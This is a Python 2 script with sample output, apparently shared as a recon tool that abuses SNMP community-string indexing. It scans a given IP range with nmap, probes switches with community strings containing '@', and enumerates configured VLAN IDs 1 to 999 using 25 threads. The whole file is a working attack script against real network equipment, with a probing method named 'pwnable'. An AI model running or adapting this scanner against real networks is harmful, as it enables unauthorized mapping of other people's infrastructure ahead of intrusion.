#!/usr/bin/env python

'''
Well this bug/feature is only useful is specific scenarios , 
let me share how this can lead to doing some recon on network switches.

** Switch should have Vlans configured on them well Vlan 1 is default.
** @ sign in the password (it happens a lot P@ssw0rd)

# python snmpVlan.py 10.54.250.0/24
Thanks nmap for the ip list
Finding vulnerable switches
10.54.250.1: Snmp open, Has Vlans configured and "@" used in its community string

Finding 10.54.250.1 VlanIDs
10.54.250.2: Snmp open, Has Vlans configured and "@" used in its community string

Finding 10.54.250.2 VlanIDs
10.54.250.3: Snmp open, Has Vlans configured and "@" used in its community string

Finding 10.54.250.3 VlanIDs
Host: 10.54.250.1 has VlanID 1 Configured
Host: 10.54.250.2 has VlanID 1 Configured
Host: 10.54.250.3 has VlanID 1 Configured
Host: 10.54.250.1 has VlanID 10 Configured
Host: 10.54.250.2 has VlanID 10 Configured
Host: 10.54.250.3 has VlanID 10 Configured
Host: 10.54.250.1 has VlanID 20 Configured
Host: 10.54.250.2 has VlanID 20 Configured
Host: 10.54.250.3 has VlanID 20 Configured
Host: 10.54.250.2 has VlanID 30 Configured
Host: 10.54.250.1 has VlanID 30 Configured
Host: 10.54.250.3 has VlanID 30 Configured
Host: 10.54.250.1 has VlanID 80 Configured
Host: 10.54.250.2 has VlanID 80 Configured
Host: 10.54.250.3 has VlanID 80 Configured
'''

from sys import argv, exit
import Queue
import threading
import time
from pysnmp.entity.rfc3413.oneliner import cmdgen
import commands

queue = Queue.Queue()


hosts = commands.getoutput("nmap -n -sL %s |grep report |cut -d \" \" -f5" %argv[1]).split("\n")
print "Thanks nmap for the ip list\nFinding vulnerable switches"

class snmpvlan(threading.Thread):
    def __init__(self, queue):
        threading.Thread.__init__(self)
        self.queue = queue

    def run(self):
        while True:
                time.sleep(0.50)
                host = self.queue.get()
                self.pwnable(host)
                self.queue.task_done()
		

    def pwnable(self,host):
            try:
                errorIndication, errorStatus, errorIndex, varBinds = cmdgen.CommandGenerator().getCmd(\
                        cmdgen.CommunityData('my-agent', 'B@STARD', 0),\
                        cmdgen.UdpTransportTarget((host, 161)),\
                        (1,3,6))
                if len(varBinds) > 0:
			
			print host.strip()+": Snmp open, Has Vlans configured and \"@\" used in its community string\n"
			print "Finding %s VlanIDs" %host
			for i in range(1,1000):
				errorIndication, errorStatus, errorIndex, varBinds = cmdgen.CommandGenerator().getCmd(\
                        	cmdgen.CommunityData('my-agent', 'meh@%d'%i, 0),\
                        	cmdgen.UdpTransportTarget((host, 161)),\
                        	(1,3,6))
				if errorStatus == 0:
					print "Host: %s has VlanID %d Configured" %(host, i)
            except Exception, e:
                print e

if __name__ == '__main__':

        for i in range(25):
                t = snmpvlan(queue)
                t.daemon = True 
                t.start()
		t.join(1)
        for host in hosts:
                queue.put(host)
        queue.join()

